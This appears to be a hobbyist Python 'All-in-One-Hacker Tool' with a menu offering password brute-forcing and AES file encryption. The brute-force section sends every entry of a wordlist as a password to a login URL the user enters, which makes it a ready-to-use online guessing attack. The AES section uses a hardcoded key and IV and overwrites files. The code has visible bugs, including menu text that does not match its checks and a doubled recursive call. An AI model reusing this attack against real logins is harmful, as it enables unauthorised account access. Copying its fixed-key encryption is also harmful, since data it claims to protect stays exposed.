class AllinOne:
    def bob(test,a ,b ,c):

        a= print("Welcome to All-in-One-Hacker Tool")
        b = print('''
        For Brute-Force enter Brute Force
        For AES encryption enter AES Encryption 
        ''')
        User_Choice = input("Choose what to do: ").upper()
        c = print("You chose: " , User_Choice.capitalize())


        # Test module!
        # if User_Choice == 'BRUTE FORCE':
        #     print("Nice")
        # elif User_Choice == 'AES':
        #     print("Nice")
        # else:
        #     print("Not an option :(")

        # -----------------------Brute Force-----------------------
        if User_Choice == 'BRUTE FORCE':
            import requests

            url = input('Place  the URL: ')
            username = input('Place the username: ')
            # chars =  "123"

            def send_request(username, passwd):
                data = {
                    "username": username,
                    "password": passwd
                }

                r = requests.get(url, data=data)
                return r


            def implist():
                worldlist = input('Wordlist Path...: ')
                print('ADD .txt TO THE FILE!')
                file = open(worldlist , 'r')
                tries = file.read().split('\n')
                file.close()
                return tries


            def main(tries):
                for passwd in tries:
                    r = send_request(username, passwd)

                    if 'failed to login' in r.text.lower():
                        print(f"Incorrect {passwd}\n")
                    else:
                        print(f"Correct Password | {passwd} | !\n")
                        break


            tries = implist()
            main(tries)
        # -----------------------Brute Force-----------------------


        # -----------------------AES-----------------------
        elif User_Choice == 'AES':
            AESQuestion = input("To Encrypt[1]\nTo Decrypt[2]\n...:")

            import hashlib
            import base64

            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad, unpad
            from Crypto.Random import get_random_bytes


            class AESCipher:
                def __init__(self, key):
                    # self.key = md5(key.encode('utf8')).digest() - creates randon key
                    self.key = b'1234567890123456'

                def encrypt(self, data):
                    # iv = get_random_bytes(AES.block_size) - creates random iv
                    iv = b'1234567890123456'
                    self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
                    return base64.b64encode(iv + self.cipher.encrypt(pad(data.encode('utf-8'),
                                                                         AES.block_size)))

                def decrypt(self, data):
                    raw = base64.b64decode(data)
                    self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])
                    return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)


            if AESQuestion == "1":


                filepath =input('Place the Path to Encrypt...: ')
                msg = open(filepath).read()
                base64encoding = base64.b64encode(str(msg).encode('ascii'))
                SHA256encoding = hashlib.sha256(str(msg).encode('UTF-8')).hexdigest()
                print(f'Base64...:{base64encoding}\nSHA256...: {SHA256encoding}')
                a = ''
                print('AES...:', AESCipher(a).encrypt(msg).decode('utf-8'))

                with open(filepath, 'w') as f:
                    f.write(AESCipher(a).encrypt(msg).decode('utf-8'))

            # Decrypt part
            #
            if AESQuestion == "2":
                Question = input("Are you sure? Yes/No...: ").capitalize()

                if Question == 'Yes':
                    a = ''
                    print('Place the file Path to Decrypt')
                    filepath = input('Place the Path to Encrypt...: ')
                    print('Place The AES Hash to Decrypt')
                    decryptmsg = input('AES Hash...: ')
                    print('Decrypted Has...:\n', AESCipher(a).decrypt(decryptmsg).decode('utf-8'))

                    with open(filepath, 'w') as f:
                        f.write(AESCipher(a).decrypt(decryptmsg).decode('utf-8'))


                elif Question == 'No':
                    print('As you wish')






        # -----------------------AES-----------------------
        else:
            object = AllinOne
            object.bob('test.a', 'test.b', 'test.c', '')
            print("Not an option :( , Try again...")
            return  object.bob('test.a','test.b','test.c','')


object = AllinOne
object.bob('test.a','test.b','test.c','')
